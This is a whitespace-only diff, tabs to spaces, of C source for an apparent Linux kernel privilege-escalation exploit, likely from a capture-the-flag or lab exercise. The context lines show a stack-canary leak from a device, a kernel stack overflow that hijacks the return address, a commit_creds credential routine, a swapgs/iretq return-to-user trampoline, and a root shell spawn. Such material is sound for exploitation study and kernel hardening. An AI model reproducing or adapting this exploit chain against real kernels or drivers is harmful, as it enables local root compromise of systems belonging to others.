@@ -50,11 +50,11 @@ uintptr_t leak_cookie(int fd, size_t leak_slots, size_t cookie_offset)
     if (nread < 0)
         DIE("read");
 
-	hexdump("[DEBUG] Leaks", leaks, leak_slots * sizeof(uintptr_t));
+    hexdump("[DEBUG] Leaks", leaks, leak_slots * sizeof(uintptr_t));
 
     uintptr_t cookie = leaks[cookie_offset / sizeof(uintptr_t)];
-	SUCCESS("Read %zd (0x%x) bytes from device; cookie = 0x%lx @ offset 0x%x (slot #%zu)",
-			nread, nread, (unsigned long)cookie, cookie_offset, cookie_offset / sizeof(uintptr_t));
+    SUCCESS("Read %zd (0x%x) bytes from device; cookie = 0x%lx @ offset 0x%x (slot #%zu)",
+            nread, nread, (unsigned long)cookie, cookie_offset, cookie_offset / sizeof(uintptr_t));
 
     free(leaks);
     return cookie;
@@ -71,13 +71,13 @@ void stack_overflow(int fd, uintptr_t cookie, uintptr_t ret_addr,
 
     size_t pos = cookie_offset / sizeof(uintptr_t);
     if (pos + 4 >= pl_slots) {
-		FAILURE(
-			"Payload length (%zu bytes) is too small: need at least %zu bytes to reach return address\n",
+        FAILURE(
+            "Payload length (%zu bytes) is too small: need at least %zu bytes to reach return address\n",
             pl_len,
             cookie_offset + 5 * sizeof(uintptr_t)
-		);
+        );
         free(pl);
-		DIE("payload");
+        DIE("payload");
     }
 
     pl[pos++] = cookie;     // Canary
@@ -87,7 +87,7 @@ void stack_overflow(int fd, uintptr_t cookie, uintptr_t ret_addr,
     pl[pos++] = ret_addr;   // ret addr (e.g. privesc)
 
     hexdump("[DEBUG] Payload", pl, pl_len);
-	INFO("Hijack return address on kernel stack to: 0x%016lx", (unsigned long)ret_addr);
+    INFO("Hijack return address on kernel stack to: 0x%016lx", (unsigned long)ret_addr);
 
     ssize_t written = write(fd, pl, pl_len);
     if (written < 0)
@@ -143,7 +143,7 @@ void privesc_kcred(uintptr_t commit_creds,
 
 /* return2user via iretq */
 void ret2user_trampoline(void)
-{	/* Set user_rip manually before trampoline */
+{    /* Set user_rip manually before trampoline */
     __asm__ __volatile__ (
         ".intel_syntax noprefix;"
         "swapgs;"
@@ -168,12 +168,12 @@ void ret2user_trampoline(void)
 /* Rooted */
 void spawn_shell(void)
 {
-	INFO("Returned to userland")
+    INFO("Returned to userland")
     if (getuid() == 0) {
-		SUCCESS("GOT ROOT SHELL!");
+        SUCCESS("GOT ROOT SHELL!");
         system("/bin/sh");
     } else {
-		FAILURE("Privesc failed");
+        FAILURE("Privesc failed");
         exit(1);
     }
 }
